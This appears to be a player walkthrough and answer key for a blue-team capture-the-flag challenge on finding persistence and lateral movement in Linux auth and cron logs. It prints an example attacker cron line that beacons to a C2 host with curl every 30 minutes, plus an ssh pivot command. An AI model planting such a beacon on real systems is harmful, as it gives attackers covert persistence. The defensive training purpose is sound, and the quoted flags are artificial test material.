# BT-04: Wellness Intake Log — Player Walkthrough

> **Difficulty:** TEAL (Intermediate)
> **Artifacts:** `woc_auth.log` (auth log) + `cron.log` (cron log)
> **Questions:** 3 (150–175 CP each)
> **Skills learned:** Detecting persistence mechanisms, analyzing cron jobs for malicious entries, identifying lateral movement in logs

This challenge gives you two log files from the Wellness Observation Center (WOC). An attacker installed persistence and pivoted to an internal host. You must reconstruct what happened by analyzing the logs.

---

## Prerequisites

- A Linux machine with `grep` and a text editor
- The artifact files `woc_auth.log` and `cron.log`
- Basic understanding of Linux authentication and cron logs

---

## Understanding the Artifacts

- **`woc_auth.log`** — Authentication log from the WOC terminal. Records SSH logins, sudo commands, and session events.
- **`cron.log`** — Cron (scheduled task) log. Records cron job executions and crontab changes.

**What is cron?** Cron is Linux's task scheduler. It runs commands at specified intervals (every minute, every hour, etc.). Attackers abuse cron to maintain persistence — if they install a malicious cron job, it runs automatically even after they disconnect.

---

## Question 1 — What persistence mechanism was installed?

**Goal:** Identify how the attacker maintained access to the system.

**What is persistence?** After gaining initial access, attackers install mechanisms to ensure they can come back even if the system reboots or their session ends. Common persistence methods include cron jobs, SSH keys, systemd services, and startup scripts.

Look in the cron log for signs of a new cron entry being installed:

```bash
grep -i "crontab" cron.log
```

Look for lines indicating a user's crontab was modified — entries like `BEGIN EDIT` or `installed crontab`:

```bash
grep -i "installed crontab\|BEGIN EDIT\|END EDIT" cron.log
```

If you find evidence that a user's crontab was modified (not by the system, but by a user session), the persistence mechanism is a **crontab** entry.

**Answer format:** `DZ{crontab}`

---

## Question 2 — What is the full cron entry added by the attacker?

**Goal:** Find the exact cron job line the attacker installed.

Look for the "installed crontab" line in the cron log:

```bash
grep "installed crontab" cron.log
```

This line contains the full cron entry in the format:
```
<schedule> <user> <command>
```

For example:
```
*/30 * * * * woc-clinic curl -s http://10.10.3.190/beacon
```

Breaking down the cron format:
- `*/30 * * * *` — Schedule (every 30 minutes). The five fields are: minute, hour, day-of-month, month, day-of-week
- `woc-clinic` — The user the job runs as
- `curl -s http://10.10.3.190/beacon` — The command (beaconing to a C2 server)

The full entry (all three parts) is the answer.

**Answer format:** `DZ{schedule user command}` (e.g., `DZ{*/30 * * * * woc-clinic curl -s http://10.10.3.190/beacon}`)

---

## Question 3 — What internal IP did the attacker pivot to?

**Goal:** Find the internal IP address the attacker connected to from the compromised host.

**What is pivoting?** After compromising one host, an attacker uses it as a jumping-off point to reach other internal hosts that aren't directly accessible from outside. This is called pivoting or lateral movement.

Look in the auth log for SSH connections initiated FROM the compromised host TO another internal host. These would appear as sudo commands running `ssh`:

```bash
grep "COMMAND=/usr/bin/ssh" woc_auth.log
```

The SSH command will include the destination IP:

```
sudo:  woc-clinic : TTY=pts/0 ; PWD=/home/woc-clinic ; USER=root ; COMMAND=/usr/bin/ssh 10.10.6.110
```

The IP after `ssh` is the pivot target.

**Answer format:** `DZ{10.10.x.x}`

---

## Summary

| Question | Technique | What you did |
|----------|-----------|-------------|
| Q1: Persistence | Cron log analysis | Found crontab install events in cron.log |
| Q2: Cron entry | Log parsing | Read the full "installed crontab" line |
| Q3: Pivot IP | Auth log analysis | Found `sudo ssh <IP>` in the auth log |

**Key takeaways:**
- **Cron is a common persistence mechanism.** Always check cron logs for unexpected entries — especially cron jobs that make network connections (curl/wget to external IPs).
- **Distinguish system cron from attacker cron.** System cron jobs run standard maintenance scripts (logrotate, sessionclean). Attacker cron jobs beacon to external IPs.
- **Lateral movement leaves traces in auth logs.** An `ssh` command run via `sudo` is a strong indicator of pivoting.
- **Correlate across log files.** The persistence is in cron.log; the pivot is in auth.log. You need both to see the full picture.